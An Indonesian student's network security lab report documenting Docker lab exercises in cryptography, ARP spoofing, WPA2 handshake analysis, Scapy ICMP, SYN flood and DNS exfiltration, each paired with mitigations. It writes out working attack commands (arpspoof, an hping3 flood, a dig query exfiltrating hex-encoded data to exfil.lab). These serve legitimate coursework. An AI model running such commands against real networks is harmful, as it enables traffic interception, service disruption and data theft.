# LAPORAN UJIAN TENGAH SEMESTER (UTS)
# PRAKTIK INFRASTRUKTUR & NETWORK ATTACKS
## Dokumentasi Praktikum Kasus 5 — Pertemuan 1–7

**Disusun oleh:**

| Identitas | Keterangan |
|---|---|
| Nama | Putra Baa'di Zaelani |
| NIM | 24552011131 |
| Kelas | TIF RP 24E CNS |
| Mata Kuliah | Network Security |
| Nomor Kasus | 5 |
| Cakupan Pertemuan | 1–7 |

---

# A. PENDAHULUAN

## 1. Latar Belakang

Praktikum Ujian Tengah Semester (UTS) Praktik Infrastruktur & Network Attacks merupakan kegiatan pembelajaran untuk memahami konsep keamanan jaringan melalui pengujian langsung menggunakan lingkungan laboratorium berbasis Docker.

Praktikum ini mencakup tujuh materi, yaitu Docker dan Volume, Kriptografi, ARP Spoofing, Analisis WPA2 Handshake, ICMP menggunakan Scapy, SYN Flood, dan DNS Exfiltration. Setiap kegiatan didokumentasikan melalui langkah pengerjaan, hasil pengujian, pembahasan, dan screenshot.

Dokumen ini adalah laporan utama. Dokumentasi pendukung per tugas (`hasil.md`) dan screenshot tersedia pada folder `tugas-1/` sampai `tugas-7/` di direktori yang sama dengan dokumen ini.

## 2. Penentuan Nomor Kasus

NIM: `24552011131`

```text
2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 1 + 3 + 1 = 25
25 mod 10 = 5
```

Berdasarkan perhitungan tersebut, nomor kasus yang dikerjakan adalah **Kasus 5**.

## 3. Parameter Praktikum

| Parameter | Nilai |
|---|---|
| Nomor Kasus | 5 |
| Container target | `target-k5` |
| Volume Docker | `vol-k5` |
| File laporan | `laporan-k5.txt` |
| Domain DNS | `k5.exfil.lab` |
| Lingkungan | Kali Linux dan Docker |

## 4. Struktur Repository

| Folder | Keterangan |
|---|---|
| `01-sumber-lab/` | Dockerfile, konfigurasi Docker Compose, dan script praktikum |
| `02-dokumen/` | Dokumen panduan dan lembar perintah praktikum |
| `03-hasil-kasus-5/` | Laporan utama (`jawaban.md`), `hasil.md` dan screenshot per tugas |

---

# B. HASIL DAN PEMBAHASAN PRAKTIKUM

# TUGAS 1 — DOCKER DAN VOLUME
**Pertemuan 1**

## 1. Tujuan
Memahami penggunaan Docker Volume untuk menyimpan data secara persisten serta menguji komunikasi antarcontainer menggunakan Docker Compose.

## 2. Langkah Pengerjaan

1. Membuat volume `vol-k5`:
   ```bash
   sudo docker volume create vol-k5
   ```
2. Menulis NIM ke dalam volume:
   ```bash
   sudo docker run --name w-k5 -v vol-k5:/data alpine sh -c 'echo 24552011131 > /data/laporan-k5.txt'
   ```
3. Menghapus container pertama:
   ```bash
   sudo docker rm w-k5
   ```
4. Membaca kembali file menggunakan container baru:
   ```bash
   sudo docker run --rm -v vol-k5:/data alpine cat /data/laporan-k5.txt
   ```
   Hasil: `24552011131`.
5. Menjalankan layanan Docker Compose:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up -d
   ```
6. Menguji komunikasi attacker ke target:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
   ```
   Hasil: halaman default Nginx berhasil ditampilkan.
7. Membersihkan lingkungan:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
   ```

## 3. Hasil Pengujian
File `laporan-k5.txt` yang berisi NIM berhasil dibaca kembali setelah container yang menulisnya dihapus. Hal ini membuktikan bahwa data pada Docker Volume tetap tersedia meskipun container dihapus. Container attacker juga berhasil mengakses halaman Nginx pada container target melalui nama service `target`.

## 4. Bukti Screenshot

<img width="846" height="73" alt="1" src="https://github.com/user-attachments/assets/48bae63f-981c-40eb-8cff-42b846e74782" />
*Gambar 1. Membuat Docker Volume `vol-k5`.*

![Tugas 1 - Screenshot 2](tugas-1/screenshot/2.png)

*Gambar 2. Menulis NIM ke file `laporan-k5.txt` di dalam volume.*
<img width="837" height="47" alt="2" src="https://github.com/user-attachments/assets/bd53370b-97c9-4d31-ab88-98ef0b83c1a4" />

*Gambar 3. Menghapus container `w-k5`.*
<img width="834" height="71" alt="3" src="https://github.com/user-attachments/assets/2efb07ff-687c-4bec-947a-ed8d3084f5e6" />

![Tugas 1 - Screenshot 4](tugas-1/screenshot/4.png)
*Gambar 4. Membaca kembali file dari volume dan memastikan data tetap tersedia.*
<img width="815" height="69" alt="4" src="https://github.com/user-attachments/assets/2b81f0af-21fa-4705-9649-bfec601e1a4b" />

![Tugas 1 - Screenshot 5](tugas-1/screenshot/5.png)
*Gambar 5. Menjalankan container target dan attacker menggunakan Docker Compose.*
<img width="839" height="113" alt="5" src="https://github.com/user-attachments/assets/8b1528c7-7481-4798-be77-2992e0d3c0a6" />

![Tugas 1 - Screenshot 6](tugas-1/screenshot/6.png)
*Gambar 6. Menguji komunikasi attacker dengan server Nginx.*
<img width="850" height="487" alt="6" src="https://github.com/user-attachments/assets/98d143eb-f433-486c-9ffd-6815f5b91ea8" />

![Tugas 1 - Screenshot 7](tugas-1/screenshot/7.png)
*Gambar 7. Membersihkan lingkungan praktikum menggunakan Docker Compose.*
<img width="851" height="110" alt="7" src="https://github.com/user-attachments/assets/5f6de2bb-c5b3-45c9-bd58-7669b1f43aa2" />

## 5. Kesimpulan
Docker Volume dapat menyimpan data secara persisten sehingga data tidak hilang ketika container dihapus. Docker Compose mempermudah pengelolaan beberapa container yang saling terhubung dalam satu jaringan.

---

# TUGAS 2 — KRIPTOGRAFI
**Pertemuan 2**

## 1. Tujuan
Memahami enkripsi dan dekripsi AES-256-CBC, pemeriksaan integritas menggunakan SHA-256, serta pembuatan sertifikat digital menggunakan OpenSSL.

## 2. Langkah Pengerjaan

### a. Enkripsi dan Dekripsi AES-256-CBC
```bash
sudo docker run --rm -v "$PWD":/work uts-openssl sh -c \
'echo isi laporan k5 > laporan-k5.txt &&
 openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k5.txt -out laporan-k5.enc -pass pass:kunci-k5-2026 &&
 sha256sum laporan-k5.txt &&
 openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k5.enc -out hasil-k5.txt -pass pass:kunci-k5-2026 &&
 sha256sum hasil-k5.txt'
```

### b. Pembuatan Sertifikat Digital
```bash
sudo docker run --rm -v "$PWD":/work uts-openssl sh -c \
'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k5.pem -out cert-k5.pem -days 30 -subj /CN=k5.uts.local &&
 openssl x509 -in cert-k5.pem -noout -subject -issuer -dates'
```

## 3. Hasil Pengujian

Hash SHA-256 file sebelum enkripsi dan setelah dekripsi menghasilkan nilai yang sama:

```text
22e90e5baa6048f9871927be4fa8af9d141b10a1071cf2b975272db8343f79b5
```

Kesamaan hash pada `laporan-k5.txt` dan `hasil-k5.txt` menunjukkan bahwa isi file hasil dekripsi sama dengan file aslinya.

Sertifikat X.509 self-signed berhasil dibuat dengan hasil:

| Field | Hasil |
|---|---|
| Subject | `CN=k5.uts.local` |
| Issuer | `CN=k5.uts.local` |
| Masa berlaku | 24 November 2026 – 24 Desember 2026 |
| Algoritma kunci | RSA 2048-bit |

Sertifikat self-signed ditandatangani oleh pemilik sertifikat itu sendiri sehingga Subject dan Issuer biasanya sama. Sertifikat ini tidak otomatis dipercaya perangkat lain. Sementara itu, sertifikat yang ditandatangani Certificate Authority (CA) memperoleh tanda tangan dari pihak penerbit yang dipercaya sehingga rantai kepercayaannya dapat diverifikasi.

## 4. Bukti Screenshot

<img width="1420" height="127" alt="1" src="https://github.com/user-attachments/assets/19675bbd-c956-4ca8-950f-8de565614b02" />
*Gambar 8. Proses enkripsi dan dekripsi AES-256-CBC serta pemeriksaan hash SHA-256.*

<img width="1427" height="333" alt="2" src="https://github.com/user-attachments/assets/085644cf-f7b4-493f-85d0-6d92c5294e70" />
*Gambar 9. Pembuatan dan pemeriksaan sertifikat X.509 self-signed.*

## 5. Kesimpulan
AES-256-CBC digunakan untuk menjaga kerahasiaan data, SHA-256 membantu memeriksa integritas data, sedangkan sertifikat X.509 digunakan untuk identifikasi entitas dalam komunikasi digital.

---

# TUGAS 3 — ARP SPOOFING
**Pertemuan 3**

## 1. Tujuan
Memahami protokol ARP, melakukan simulasi ARP Spoofing pada jaringan laboratorium, serta mempelajari mitigasi menggunakan Static ARP.

## 2. Langkah Pengerjaan

1. Membuat jaringan internal:
   ```bash
   sudo docker network create --internal lab-arp-k5
   ```
2. Menjalankan container korban:
   ```bash
   sudo docker run -d --name korban-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
   ```
3. Menjalankan container gateway:
   ```bash
   sudo docker run -d --name gateway-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
   ```
4. Menjalankan container penyerang:
   ```bash
   sudo docker run -d --name penyerang-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
   ```
5. Memeriksa alamat IP container:
   ```bash
   sudo docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k5").IPAddress}}' korban-k5 gateway-k5 penyerang-k5
   ```
   Hasil: korban `172.20.0.2`, gateway `172.20.0.3`, dan penyerang `172.20.0.4`.
6. Memeriksa tabel ARP sebelum spoofing:
   ```bash
   sudo docker exec korban-k5 arp -a
   ```
7. Menjalankan simulasi ARP Spoofing:
   ```bash
   sudo docker exec -d penyerang-k5 timeout 20 arpspoof -i eth0 -t 172.20.0.2 172.20.0.3
   ```
8. Memeriksa tabel ARP setelah spoofing:
   ```bash
   sudo docker exec korban-k5 arp -a
   ```
9. Menerapkan Static ARP:
   ```bash
   sudo docker exec korban-k5 arp -s 172.20.0.3 $(sudo docker exec gateway-k5 cat /sys/class/net/eth0/address)
   ```
10. Memeriksa tabel ARP setelah mitigasi:
    ```bash
    sudo docker exec korban-k5 arp -a
    ```

## 3. Hasil Pengujian

| Kondisi | MAC Address Gateway |
|---|---|
| Sebelum spoofing | `06:07:6d:ed:83:2c` |
| Setelah spoofing | `c2:a5:0b:4f:be:c2` |
| Setelah mitigasi | `06:07:6d:ed:83:2c` |

Setelah simulasi dijalankan, pemetaan alamat MAC gateway pada tabel ARP korban berubah menjadi MAC milik container penyerang. Setelah Static ARP diterapkan, pemetaan kembali menggunakan MAC asli gateway dengan status permanen (`PERM`).

## 4. Bukti Screenshot

<img width="844" height="68" alt="1" src="https://github.com/user-attachments/assets/38ba18d2-c60d-4868-8e20-738788064bce" />
*Gambar 10. Membuat jaringan internal `lab-arp-k5`.*

<img width="844" height="68" alt="1" src="https://github.com/user-attachments/assets/79d9dd80-f284-45aa-be66-f53b9165d5fa" />
*Gambar 11. Menjalankan container korban.*

<img width="829" height="80" alt="2" src="https://github.com/user-attachments/assets/3a9c7f49-db3f-4c82-ba3f-c3a4f714c430" />
*Gambar 12. Menjalankan container gateway.*

<img width="860" height="65" alt="3" src="https://github.com/user-attachments/assets/13097941-35f3-4267-90b3-894d612148d3" />
*Gambar 13. Menjalankan container penyerang.*

<img width="830" height="77" alt="4" src="https://github.com/user-attachments/assets/ded1d69c-3057-44ef-abd5-4f8482b46e86" />
*Gambar 14. Memeriksa alamat IP setiap container.*

<img width="823" height="56" alt="6" src="https://github.com/user-attachments/assets/14b8b3a8-fd5d-4ab4-8979-b523cb89d322" />
*Gambar 15. Tabel ARP korban sebelum serangan.*

<img width="840" height="47" alt="7" src="https://github.com/user-attachments/assets/d0dc51e6-c092-41d2-8f09-855fa25c9215" />
*Gambar 16. Menjalankan simulasi ARP Spoofing.*

<img width="827" height="82" alt="8" src="https://github.com/user-attachments/assets/7756406a-0401-49cd-8021-22035eaa678d" />
*Gambar 17. Perubahan MAC Address gateway setelah spoofing.*

<img width="914" height="42" alt="9" src="https://github.com/user-attachments/assets/f9835b3b-8d17-4976-88c5-8525cac006f7" />
*Gambar 18. Menerapkan Static ARP sebagai mitigasi.*

<img width="833" height="81" alt="10" src="https://github.com/user-attachments/assets/9a4b282f-e8a0-464a-96b9-88042c6672a2" />
*Gambar 19. Tabel ARP setelah mitigasi diterapkan.*

## 5. Mitigasi Lain
Selain Static ARP, ARP Spoofing dapat dikurangi menggunakan Dynamic ARP Inspection (DAI). Fitur ini memvalidasi paket ARP berdasarkan informasi IP dan MAC yang dipercaya, misalnya melalui DHCP Snooping.

## 6. Kesimpulan
ARP Spoofing dapat mengubah pemetaan IP dan MAC Address pada tabel ARP korban. Static ARP membantu mempertahankan pemetaan yang benar, sedangkan Dynamic ARP Inspection dapat menjadi perlindungan tambahan pada jaringan yang mendukung fitur tersebut.

---

# TUGAS 4 — ANALISIS WPA2 HANDSHAKE
**Pertemuan 4**

## 1. Tujuan
Memahami proses autentikasi WPA2 dan menganalisis file handshake menggunakan Aircrack-ng serta wordlist praktikum.

## 2. Langkah Pengerjaan

1. Memeriksa file capture dan wordlist:
   ```bash
   ls -lh handshake-k5.cap wordlist-k5.txt
   ```
2. Memeriksa informasi capture:
   ```bash
   capinfos handshake-k5.cap
   ```
3. Mencoba analisis menggunakan Aircrack-ng:
   ```bash
   aircrack-ng -w wordlist-k5.txt handshake-k5.cap
   ```
4. Memeriksa header file:
   ```bash
   xxd -l 128 handshake-k5.cap
   ```
5. Memeriksa hash file:
   ```bash
   sha256sum handshake-k5.cap
   ```

## 3. Hasil Pengujian

File `handshake-k5.cap` yang disediakan tidak dapat dianalisis oleh Aircrack-ng. Hasil pemeriksaan menunjukkan:

- `capinfos` melaporkan file capture rusak atau tidak dapat dibaca dengan benar.
- Aircrack-ng membaca 0 paket.
- Aircrack-ng menyatakan file bukan capture 802.11 yang valid.
- Tidak ditemukan jaringan yang dapat dianalisis.

Dengan demikian, pengujian berhenti pada tahap pembacaan file. Tidak ada hasil `KEY FOUND` maupun `KEY NOT FOUND` karena file belum berhasil dibaca sebagai capture yang valid. Pemeriksaan `xxd` menunjukkan magic number pcap, tetapi hal tersebut belum membuktikan bahwa isi file merupakan capture 802.11 yang valid.

## 4. Bukti Screenshot

<img width="672" height="86" alt="1" src="https://github.com/user-attachments/assets/5fad8222-00f3-48fb-ab3b-dfc4cc814d1f" />
*Gambar 20. Memeriksa ketersediaan file capture dan wordlist.*

<img width="681" height="373" alt="2" src="https://github.com/user-attachments/assets/58d19bac-ec5a-4cf6-9e23-d5521d5e2784" />
*Gambar 21. Memeriksa isi wordlist yang berisi 20 kandidat kata sandi.*

<img width="676" height="113" alt="3" src="https://github.com/user-attachments/assets/8b754e73-8829-4223-a444-fb6627649c13" />
*Gambar 22. Hasil pemeriksaan file menggunakan capinfos.*

<img width="682" height="190" alt="4" src="https://github.com/user-attachments/assets/95dfa713-42ce-4927-85d4-26f70bf0b788" />
*Gambar 23. Aircrack-ng gagal membaca file capture sebagai format 802.11 yang valid.*

<img width="716" height="234" alt="5" src="https://github.com/user-attachments/assets/5ca7b8f7-d68a-45f9-bf8f-37a1d9c42bae" />
*Gambar 24. Pemeriksaan header file menggunakan xxd.*

<img width="688" height="75" alt="6" src="https://github.com/user-attachments/assets/89c674de-f23a-4c31-9643-fdb39f1c62a4" />
*Gambar 25. Pemeriksaan hash SHA-256 file capture.*

## 5. Pembahasan WPA2 Four-Way Handshake

Secara konsep, proses autentikasi WPA2 menggunakan empat tahapan:

1. **Message 1 (AP → Client):** Access Point mengirimkan ANonce kepada client.
2. **Message 2 (Client → AP):** Client menghasilkan SNonce, menghitung PTK, lalu mengirimkan SNonce beserta MIC kepada Access Point.
3. **Message 3 (AP → Client):** Access Point mengirimkan GTK yang telah dienkripsi beserta MIC kepada client.
4. **Message 4 (Client → AP):** Client mengirimkan konfirmasi bahwa pesan telah diterima. Setelah proses ini selesai, komunikasi terenkripsi dapat digunakan.

## 6. Kesimpulan
Aircrack-ng membutuhkan file capture yang valid dan berisi informasi handshake WPA2. Pada praktikum ini, file yang tersedia tidak dapat dibaca sebagai capture 802.11 yang valid sehingga analisis tidak dapat dilanjutkan ke tahap pencocokan wordlist. Kendala ini didokumentasikan sesuai hasil pengujian.

---

# TUGAS 5 — ICMP MENGGUNAKAN SCAPY
**Pertemuan 5**

## 1. Tujuan
Memahami protokol ICMP dan menggunakan Scapy untuk membuat serta mengirim paket ICMP, kemudian mengamati respons dari host tujuan.

## 2. Langkah Pengerjaan

```bash
sudo docker run --rm --network lab-arp-k5 -v "$PWD/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.20.0.2
```

## 3. Hasil Pengujian

Paket ICMP berhasil dikirim dan mendapatkan respons dari host tujuan.

```text
Mengirim: IP / ICMP 172.20.0.5 > 172.20.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

Tipe ICMP `0` menunjukkan bahwa paket yang diterima merupakan Echo Reply.

## 4. Bukti Screenshot

<img width="1087" height="89" alt="1" src="https://github.com/user-attachments/assets/c0bc5a2d-132f-40fa-a25e-3a13bac468f2" />
*Gambar 26. Pengiriman ICMP Echo Request dan penerimaan Echo Reply menggunakan Scapy.*

## 5. Pembahasan Smurf Attack

Smurf Attack merupakan serangan Denial of Service (DoS) yang memanfaatkan ICMP Echo Request dan alamat broadcast. Penyerang memalsukan alamat IP korban sebagai alamat sumber paket. Paket dikirim ke alamat broadcast sehingga sejumlah host dapat mengirimkan balasan ICMP secara bersamaan menuju korban.

Mitigasi dapat dilakukan dengan membatasi respons terhadap ICMP broadcast, melakukan penyaringan paket, dan menggunakan konfigurasi router yang menolak directed broadcast yang tidak diperlukan.

## 6. Kesimpulan
Scapy dapat digunakan untuk membuat dan mengirim paket jaringan secara terprogram. Praktikum ini menunjukkan mekanisme ICMP Echo Request dan Echo Reply yang juga dapat disalahgunakan dalam serangan seperti Smurf Attack.

---

# TUGAS 6 — SYN FLOOD DAN TCP THREE-WAY HANDSHAKE
**Pertemuan 6**

## 1. Tujuan
Memahami proses TCP Three-Way Handshake dan mempelajari simulasi SYN Flood secara terbatas pada lingkungan laboratorium.

## 2. Langkah Pengerjaan

1. Menjalankan container praktikum:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
   ```
2. Memeriksa jumlah koneksi `SYN_RECV` sebelum serangan:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
   ```
   Hasil: `0`.
3. Menjalankan simulasi SYN Flood selama 15 detik:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
   ```
4. Memantau status `SYN_RECV` sebanyak 10 kali dengan interval satu detik. Hasil:
   ```text
   2, 1, 0, 1, 1, 0, 0, 0, 0, 0
   ```
5. Mengamati lalu lintas menggunakan tcpdump ketika satu koneksi HTTP dibuat menggunakan curl. Hasil: 12 paket tertangkap.
6. Membersihkan lingkungan:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
   ```

## 3. Pembahasan TCP Three-Way Handshake

1. **SYN:** Client mengirimkan permintaan untuk memulai koneksi TCP.
2. **SYN-ACK:** Server menerima permintaan dan mengirimkan respons.
3. **ACK:** Client mengirimkan konfirmasi sehingga koneksi TCP dapat digunakan.

## 4. Hasil Pengujian

| Kondisi | Jumlah `SYN_RECV` |
|---|---|
| Sebelum serangan | `0` |
| Selama serangan (10 sampel) | `2, 1, 0, 1, 1, 0, 0, 0, 0, 0` |

Nilai `SYN_RECV` sempat meningkat menjadi 1–2 ketika simulasi dijalankan, kemudian kembali turun menjadi 0 pada beberapa pengamatan berikutnya. Hasil ini menunjukkan adanya koneksi setengah terbuka yang sempat teramati, tetapi tidak menunjukkan bahwa server mengalami kelumpuhan.

Pada pengujian tcpdump, sebanyak 12 paket tertangkap ketika satu koneksi HTTP dibuat. Paket yang diamati mencakup TCP Three-Way Handshake, HTTP GET, HTTP 200 OK, serta proses penutupan koneksi FIN/ACK.

## 5. Bukti Screenshot

<img width="879" height="162" alt="1" src="https://github.com/user-attachments/assets/99efbc88-1d5c-4602-86ec-0f0cee8c72f9" />
*Gambar 27. Menjalankan container attacker dan target menggunakan Docker Compose.*

<img width="920" height="72" alt="2" src="https://github.com/user-attachments/assets/179ac2f3-8437-4b1e-b038-19cd9b4d074e" />
*Gambar 28. Memeriksa status SYN_RECV sebelum serangan.*

<img width="1057" height="50" alt="3" src="https://github.com/user-attachments/assets/3c622444-45e9-44d2-80cc-ab0b6e544969" />
*Gambar 29. Menjalankan simulasi SYN Flood selama 15 detik.*

<img width="1261" height="201" alt="4" src="https://github.com/user-attachments/assets/ae1af218-1746-402f-9164-4a5a5fa513e0" />
*Gambar 30. Memantau perubahan jumlah koneksi SYN_RECV selama pengujian.*

<img width="1417" height="372" alt="5" src="https://github.com/user-attachments/assets/c6263b76-1036-4051-81e3-06caa57ffe39" />
*Gambar 31. Mengamati paket TCP dan HTTP menggunakan tcpdump.*

<img width="829" height="112" alt="6" src="https://github.com/user-attachments/assets/69ec7d1c-64f7-4101-b047-6d2eed42f9ed" />
*Gambar 32. Membersihkan container dan jaringan setelah praktikum.*

## 6. Mitigasi SYN Flood
Salah satu metode mitigasi SYN Flood adalah SYN Cookies. Server menggunakan nilai sequence number pada SYN-ACK untuk menyimpan informasi koneksi sementara, kemudian mengalokasikan sumber daya koneksi secara penuh setelah menerima ACK yang valid dari client.

## 7. Kesimpulan
SYN Flood memanfaatkan pengiriman paket SYN dalam jumlah besar untuk berpotensi membebani sumber daya server. Melalui praktikum ini, perubahan status `SYN_RECV` dapat diamati dan tcpdump membantu memahami proses komunikasi TCP.

---

# TUGAS 7 — DNS EXFILTRATION
**Pertemuan 7**

## 1. Tujuan
Memahami penyalahgunaan DNS sebagai media pengiriman data serta mempelajari cara mendeteksi pola query DNS yang mencurigakan melalui analisis log.

## 2. Langkah Pengerjaan

1. Menjalankan layanan DNS dan attacker:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
   ```
2. Mengubah NIM menjadi hexadecimal:
   ```bash
   echo -n 24552011131 | xxd -p
   ```
   Hasil: `3234353532303131313331`.
3. Mengirim query DNS:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131313331.k5.exfil.lab @dns
   ```
   Hasil: `10.0.0.99`.
4. Menyimpan log DNS:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k5.log
   ```
5. Menganalisis log:
   ```bash
   python3 01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py dns-k5.log
   ```
6. Mengubah kembali hexadecimal menjadi teks:
   ```bash
   echo 3234353532303131313331 | xxd -r -p
   ```
   Hasil: `24552011131`.
7. Membersihkan lingkungan:
   ```bash
   sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
   ```

## 3. Hasil Pengujian

Query DNS berhasil dikirim menggunakan subdomain yang berisi NIM dalam format hexadecimal:

```text
3234353532303131313331.k5.exfil.lab
```

DNS memberikan respons `10.0.0.99`. Log DNS berhasil disimpan dan dianalisis menggunakan script `analisis_dns.py`. Hasil analisis menunjukkan satu query di bawah domain induk `exfil.lab` yang ditandai sebagai aktivitas mencurigakan.

Setelah decoding hexadecimal, data kembali menjadi:

```text
24552011131
```

Hasil tersebut sesuai dengan NIM yang digunakan pada praktikum.

## 4. Bukti Screenshot

<img width="860" height="117" alt="1" src="https://github.com/user-attachments/assets/4acfb09d-ad7c-497a-bab8-6defb9530827" />
*Gambar 33. Menjalankan service DNS dan attacker.*

<img width="840" height="61" alt="2" src="https://github.com/user-attachments/assets/6468316d-123a-4ce9-bc0c-71b212b9fda3" />
*Gambar 34. Mengubah NIM menjadi format hexadecimal.*

<img width="1075" height="57" alt="3" src="https://github.com/user-attachments/assets/d3547057-6e0b-44b1-814e-caeea1f3e83c" />
*Gambar 35. Mengirim query DNS dan memperoleh respons dari server.*

<img width="1421" height="287" alt="4" src="https://github.com/user-attachments/assets/300e321e-84bd-414d-8c35-655429fde608" />
*Gambar 36. Menyimpan log DNS dan melakukan decoding data.*

<img width="849" height="117" alt="5" src="https://github.com/user-attachments/assets/888421d8-6438-4afa-997b-da1f85f8f111" />
*Gambar 37. Hasil analisis script deteksi DNS yang menunjukkan satu query mencurigakan.*

<img width="825" height="74" alt="6" src="https://github.com/user-attachments/assets/02a9fab0-d0bf-4d70-ad87-a9fb43c2634d" />
*Gambar 38. Memverifikasi hasil decoding hexadecimal menjadi NIM.*

<img width="838" height="108" alt="7" src="https://github.com/user-attachments/assets/3b532449-5179-48d7-b03c-ae8655fdcfa7" />
*Gambar 39. Membersihkan lingkungan praktikum.*

## 5. Pembahasan DNS Exfiltration

### a. Mengapa DNS Exfiltration Sulit Diblokir oleh Firewall Biasa?
DNS Exfiltration memanfaatkan protokol DNS yang umumnya diizinkan oleh firewall untuk kebutuhan resolusi nama domain. Karena lalu lintasnya dapat terlihat seperti permintaan domain biasa, aktivitas pengiriman data sulit dibedakan apabila firewall hanya menyaring berdasarkan alamat IP atau nomor port.

### b. Indikator Deteksi
Indikator yang dapat digunakan antara lain panjang label subdomain yang tidak biasa, subdomain berisi karakter hexadecimal atau pola acak, frekuensi query yang tinggi menuju domain tertentu, serta pola query yang tidak sesuai dengan aktivitas DNS normal. Analisis panjang label dan entropi dapat membantu mengidentifikasi pola mencurigakan.

## 6. Kesimpulan
DNS Exfiltration menyalahgunakan protokol DNS untuk mengirimkan data melalui query. Pada praktikum ini, NIM berhasil dikonversi menjadi hexadecimal, dikirim melalui query DNS, dicatat dalam log, dan dikembalikan melalui decoding. Analisis log DNS dapat membantu mendeteksi aktivitas yang tidak biasa.

---

# C. KESIMPULAN AKHIR

Berdasarkan praktikum UTS Kasus 5, tujuh materi telah dipelajari dan didokumentasikan:

1. **Docker dan Volume:** memahami penyimpanan data persisten dan komunikasi antarcontainer.
2. **Kriptografi:** memahami enkripsi AES-256-CBC, pemeriksaan integritas SHA-256, dan pembuatan sertifikat digital.
3. **ARP Spoofing:** memahami perubahan pemetaan IP dan MAC Address serta mitigasi menggunakan Static ARP.
4. **Analisis WPA2 Handshake:** memahami proses autentikasi WPA2 dan memeriksa file capture menggunakan Aircrack-ng.
5. **ICMP dengan Scapy:** memahami pengiriman ICMP Echo Request dan penerimaan Echo Reply.
6. **SYN Flood:** memahami TCP Three-Way Handshake dan mengamati koneksi setengah terbuka selama simulasi.
7. **DNS Exfiltration:** memahami pengiriman data melalui query DNS dan menganalisis pola permintaan DNS yang mencurigakan.

Enam tugas menghasilkan pengujian sesuai hasil yang diamati. Tugas 4 belum dapat dilanjutkan ke pencocokan wordlist karena file capture yang disediakan tidak dapat dibaca sebagai capture 802.11 yang valid. Seluruh hasil dituliskan berdasarkan proses pengerjaan dan keluaran terminal yang diperoleh selama praktikum.

# D. PENUTUP

Demikian laporan UTS Kasus 5 ini dibuat sebagai dokumentasi kegiatan praktikum Pertemuan 1 sampai 7. Melalui kegiatan ini, saya memperoleh pengalaman menggunakan berbagai tools keamanan jaringan, menjalankan lingkungan laboratorium berbasis Docker, melakukan pengujian, serta menganalisis hasil praktikum.

---

**Nama:** Putra Baadi Zaelani  
**NIM:** 24552011131  
**Kelas:** TIF RP 24E CNS

**Repository GitHub:**  
https://github.com/Baadizlniii/UTS-Network-Security-Putra-Baadi-Zaelani
